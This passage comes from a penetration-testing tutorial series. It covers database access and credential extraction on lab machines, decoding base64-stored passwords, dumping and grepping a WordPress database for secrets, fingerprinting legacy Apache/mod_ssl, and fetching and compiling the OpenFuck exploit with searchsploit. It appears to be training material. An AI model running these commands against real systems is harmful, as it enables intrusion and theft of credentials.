| `-D Users` | select the database |
| `-e 'SQL'` | execute one statement and exit — scriptable, unlike the interactive prompt |
| `-N -B` | no column headers, tab-separated — the form you want when piping into other tools |

**`localhost` vs `127.0.0.1` is not cosmetic.** `mysql -u root` with no `-h` uses a
**socket** and authenticates by **UID** — so on a modern Ubuntu, root at the console
gets in with no password. `-h 127.0.0.1` forces **TCP** and authenticates by
**password**. An account that works one way and not the other is not a bug; it is two
different authentication paths. Machine 10 turns on exactly this.

**Reading the result:** the `Password` column holds **base64**, not a hash. There is no
`$2b$`, no 64-hex string — just `A-Za-z0-9+/` with `=` padding. Decode locally:
`echo "Sld6WHVCSkpOeQ==" | base64 -d` → `JWzXuBJJNy`. Storing passwords base64-encoded
offers precisely the same protection as storing them in plaintext, because base64 is an
*encoding* with no key and no work factor.

```bash
mysqldump -h TARGET -u root -p'PASS' wordpress > wp.sql
grep -iE 'flag|password|secret|api_key' wp.sql | head -20
```

Dumping the whole database and grepping it is often faster than writing correct SQL:
WordPress stores serialised PHP in `wp_options` and post content in `wp_posts`, and
secrets hide in both.

**PostgreSQL**, which Machine 3 also exposes:

```bash
psql -h TARGET -U dbuser -d drupaldb -c 'SELECT uid,name,pass FROM users;'
PGPASSWORD='R0ck3t' psql -h TARGET -U dbuser -d drupaldb -c '\dt'
```

`PGPASSWORD` is the environment variable form (psql has no `-p password` flag — `-p` is
the *port*). `\dt` lists tables, `\du` lists roles, `\l` lists databases, `\q` quits —
the backslash commands are psql's own, not SQL.

---

### 9.7 Legacy services — getting the exact version

```bash
nmap -sV -p80,443,139,445,111 TARGET
```

```text
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp open  rpcbind     2 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
```

Read line 80 as a **software bill of materials**: `Apache httpd 1.3.20`, on `Unix`
(Red-Hat/Linux), with `mod_ssl/2.8.4` and `OpenSSL/0.9.6b`. **That exact triple is the
target selector for OpenFuck (CVE-2002-0082).** Exploits against this class of bug are
built for a specific version *and* a specific distribution's memory layout — so
"(Red-Hat/Linux)" is not decoration, it is the parameter you must match. `111/tcp rpcbind
2 (RPC #100000)` shows the RPC program number; `139/tcp netbios-ssn Samba smbd
(workgroup: MYGROUP)` gives the Samba daemon and its workgroup, though the *version* only
appears with `smb-os-discovery` or `enum4linux`.

**The discipline that follows:**

```bash
searchsploit -t apache 1.3.20
searchsploit -t mod_ssl
searchsploit -t samba 2.2
searchsploit -m linux/remote/10.c
less linux/remote/10.c          # READ IT before compiling
gcc -o t2o linux/remote/10.c    # expect errors on a 2003-era source
```

Expect to add flags (`-lcrypto -lssl`, `-z execstack`), to edit a target-offset table to
match the distribution, and to install 32-bit build support for a 32-bit target. **That
friction is the lesson**, not an obstacle to it: real exploitation of legacy
infrastructure is mostly build engineering, and the person who can make a 20-year-old
`.c` file compile is the person who owns the box.

---

_Back to [Learning Path 1](README.md) · previous: [02 — Web Attacks](02-Web-Attacks.md) · next: [04 — Credentials and Cracking](04-Credentials-and-Cracking.md)._
